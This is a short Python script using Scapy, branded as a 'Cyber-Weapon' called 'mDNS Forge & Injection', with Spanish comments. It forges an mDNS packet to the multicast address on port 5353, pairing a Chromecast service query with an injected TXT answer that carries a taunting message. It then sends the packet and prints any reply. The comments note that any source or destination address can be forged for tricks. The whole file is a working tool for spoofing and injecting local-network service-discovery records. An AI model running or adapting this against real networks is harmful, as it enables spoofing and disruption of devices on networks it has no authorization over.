#############################################################################################
#                                                                                           #
#          @@@@@@@@@@@@@@@@@@             ((_.-'-._| mDNS Forge & Injection  |_.-'-._))     #
#        @@@@@@@@@@@@@@@@@@@@@@@                                                            #
#      @@@@@@@@@@@@@@@@@@@@@@@@@@@               by Fz3r0: I can read your soul             #
#     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                                         #
#    @@@@@@@@@@@@@@@/      \@@@/   @      [+] Cyber-Weapon:............. mDNS F & I         #
#   @@@@@@@@@@@@@@@@\      @@  @___@      [+] Version:.................. 1.0                #
#   @@@@@@@@@@@@@ @@@@@@@@@@  | \@@@@@    [+] Author:................... Fz3r0              #
#   @@@@@@@@@@@@@ @@@@@@@@@\__@_/@@@@@    [+] Github:................... github.com/Fz3r0   #
#    @@@@@@@@@@@@@@@/,/,/./´/_|.\`\,\     [+] Twitter:.................. @Fz3r0_OPs         #
#      @@@@@@@@@@@@@|  | | | | | | | |    [+] Youtube:.................. @Fz3r0_OPs         #
#                  \_|_|_|_|_|_|_|_|                                                        #
#                                                                                           #
#############################################################################################

# Importa las clases necesarias de Scapy
from scapy.all import *
import sys

# Verifica si se proporciona la dirección IP como argumento de línea de comandos
# OJO!!!! Para que sea mDNS es importante que tanto la IP como puerto sean multicast obviamente... <.< 
if len(sys.argv) < 2:
    print("Para usar: python3 mDNS_TXT_Fz3r0.py 224.0.0.251 (u otra direccion multicast)")
    sys.exit(1)

# Obtiene la dirección IP de destino desde la línea de comandos
    # OJO!!!! Aquí se puede forjar cualquier dirección para hacer trucos... 
    # Pero para que el paquete sea considerado mDNS bien formado... usar IP multicast!!!
target_ip = sys.argv[1]

# mdns query string (elegir uno dependiendo el servicio)
query = "_googlecast._tcp.local"   # google & chromecast
#query = "_services._dns-sd._udp.local"   # general mdns
# query = "_ipp._tcp.local"  # impresoras

# mensaje TXT que se incluirá en la respuesta mDNS (ya que es del tipo PTR QU - TXT)
txt_payload = "Este mDNS va dirigido hacia dispositivos Chromecast UwU 💀"

# Construye el paquete:
# - IP: especifica la dirección IP de destino
# - UDP: especifica el puerto de destino (5353) y de origen (5353) para mDNS (multicast)
# - DNS: configura el paquete como una consulta mDNS con una respuesta TXT
pkt = (
    IP(dst=target_ip) /
    UDP(dport=5353, sport=5353) /
    DNS(
        rd=1,  # Bandera de Recursion Desired (solicita recursividad)
        qd=DNSQR(qname=query, qtype='PTR'),  # Pregunta DNS de tipo PTR
        an=DNSRR(rrname=query, rdata=txt_payload, type='TXT')  # Respuesta DNS con el mensaje TXT
    )
)

# Envía el paquete y espera por una respuesta
ans = sr1(pkt, verbose=0, timeout=2)

# Imprime la respuesta (esto aún se puede hacer más detallado y queda pendiente para futuras versiones)
if ans:
    ans.show()
else:
    print("No se recibió respuesta.")



